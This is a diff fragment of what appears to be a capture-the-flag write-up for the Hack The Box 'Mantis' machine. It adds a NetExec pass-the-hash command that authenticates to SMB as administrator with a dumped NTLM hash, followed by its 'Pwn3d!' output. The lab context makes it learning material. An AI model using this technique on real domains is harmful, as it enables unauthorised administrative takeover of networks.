@@ -482,3 +482,12 @@ MANTIS$:des-cbc-md5:252608c770c176cd
 ```
 Dumped all the hashes using a DCSync
 
+```python
+nxc smb mantis.htb.local -u 'administrator' -H '22140219fd9432e584a355e54b28ecbb'
+SMB         10.129.17.20    445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.17.20    445    MANTIS           [+] htb.local\administrator:22140219fd9432e584a355e54b28ecbb (Pwn3d!)
+```
+The administrator is pwned!
+
+
+
